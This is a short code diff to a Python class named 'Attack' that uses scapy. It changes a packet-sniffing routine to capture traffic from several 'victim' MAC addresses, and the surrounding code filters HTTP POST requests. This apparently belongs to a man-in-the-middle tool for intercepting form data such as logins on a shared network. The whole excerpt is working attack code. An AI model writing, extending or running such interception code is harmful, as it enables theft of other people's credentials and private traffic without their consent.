@@ -68,7 +68,8 @@ class Attack():
         time.sleep(2)
     
     def sniff_packets(self):
-        scapy.sniff(filter="ether src {}".format(self.ip_mac[self.victim]), prn=self.process_packet, iface=self.interfaces[1], store=False)
+        for v in self.victim:
+            scapy.sniff(filter="ether src {}".format(self.ip_mac[v]), prn=self.process_packet, iface=self.interfaces[1], store=False)
 
     def process_packet(self, packet):
         if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == 'POST':
